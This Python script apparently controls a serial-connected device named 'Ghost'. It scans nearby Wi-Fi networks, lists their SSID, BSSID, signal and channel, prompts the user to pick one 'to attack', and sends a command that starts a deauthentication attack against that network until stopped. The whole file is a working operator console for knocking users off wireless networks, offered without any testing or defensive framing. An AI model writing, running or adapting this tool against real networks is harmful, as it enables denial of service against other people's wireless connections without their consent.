import serial
import time
import sys

PORT      = 'COM3'
BAUD_RATE = 115200

def open_serial():
    return serial.Serial(PORT, BAUD_RATE, timeout=5)

def wait_ready(s):
    print("Waiting for Ghost to boot...")
    while True:
        line = s.readline().decode('latin-1').strip()
        if line:
            print(f"  {line}")
        if 'GHOST:READY' in line:
            print("Ghost is ready.\n")
            break

def send_cmd(s, cmd):
    s.write((cmd + '\n').encode())
    print(f">> {cmd}")

def read_until(s, marker, timeout=10):
    start = time.time()
    while time.time() - start < timeout:
        line = s.readline().decode('latin-1').strip()
        if line:
            print(f"  {line}")
        if marker in line:
            return True
    return False

def scan(s):
    print("=== Scanning for networks ===")
    send_cmd(s, 'CMD:SCAN_AP')
    networks = []
    start = time.time()
    while time.time() - start < 10:
        line = s.readline().decode('latin-1').strip()
        if not line:
            continue
        print(f"  {line}")
        if line.startswith('AP:'):
            # Format: AP:SSID,BSSID,RSSI,CH
            parts = line[3:].split(',')
            if len(parts) >= 4:
                networks.append({
                    'ssid':  parts[0],
                    'bssid': parts[1],
                    'rssi':  parts[2],
                    'ch':    parts[3],
                })
        if 'SCAN:DONE' in line:
            break
    return networks

def pick_target(networks):
    if not networks:
        print("No networks found.")
        return None
    print("\n=== Networks found ===")
    for i, n in enumerate(networks):
        print(f"  [{i}] SSID: {n['ssid']:<32} BSSID: {n['bssid']}  RSSI: {n['rssi']}  CH: {n['ch']}")
    print()
    choice = input("Enter number to attack (or q to quit): ").strip()
    if choice.lower() == 'q':
        return None
    try:
        return networks[int(choice)]['ssid']
    except (ValueError, IndexError):
        print("Invalid choice.")
        return None

def deauth(s, ssid):
    print(f"\n=== Starting deauth attack on: {ssid} ===")
    send_cmd(s, f'CMD:DEAUTH:{ssid}')
    # Stream output until user presses Ctrl+C
    print("Attack running. Press Ctrl+C to stop.\n")
    try:
        while True:
            line = s.readline().decode('latin-1').strip()
            if line:
                print(f"  {line}")
    except KeyboardInterrupt:
        print("\nStopping attack...")
        send_cmd(s, 'CMD:DEAUTH_STOP')
        time.sleep(1)
        while True:
            line = s.readline().decode('latin-1').strip()
            if line:
                print(f"  {line}")
            if 'DEAUTH:STOPPED' in line:
                break

def main():
    s = open_serial()
    wait_ready(s)
    time.sleep(0.5)

    networks = scan(s)
    ssid = pick_target(networks)
    if ssid:
        deauth(s, ssid)

    s.close()
    print("Done.")

if __name__ == '__main__':
    main()
